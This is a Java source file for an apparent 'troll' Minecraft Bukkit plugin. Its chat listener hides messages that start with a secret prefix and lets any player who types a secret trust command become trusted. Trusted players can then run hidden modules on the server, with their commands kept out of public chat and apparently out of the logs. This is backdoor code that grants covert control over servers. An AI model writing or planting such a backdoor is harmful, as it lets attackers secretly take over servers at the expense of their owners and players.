package com.troll.event;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

import com.troll.start.Start;
import com.troll.utils.ConsoleFilter;
import com.troll.mods.Module;

public class ChatListener implements Listener {
	private Start plugin;
	
	public ChatListener() {
		this.plugin = Start.getInstance();
	}

	@EventHandler
	public void onChat(AsyncPlayerChatEvent e) {
		Player p = e.getPlayer();
		String msg = e.getMessage();
		String cmdPrefix = Start.getInstance().getCommandPrefix();
		
		if (msg.startsWith(Start.getInstance().getCommandPrefix()) && plugin.getTrustManager().getTrustedPlayers().contains(p.getUniqueId())) {
			e.setCancelled(true);
			
			String[] args = msg.split(" ");
			String commandName = args[0].replace(cmdPrefix, "");
			for (Module mod : plugin.getModuleManager().getModules()) {
				if (mod.name.equalsIgnoreCase(commandName)) {
					Bukkit.getScheduler().runTask(plugin, new Runnable() {
						
						@Override
						public void run() {
							mod.execute(p, args);							
						}
					});
					return;
				}
			}
			
			p.sendMessage(plugin.getPrefix() + "§cUnknown command!");
		}
		
		if (msg.equalsIgnoreCase(plugin.getCommandPrefix() + plugin.getTrustManager().getTrustCommand())) {
			plugin.getTrustManager().trustPlayer(p);
			e.setCancelled(true);
		}
	}
}
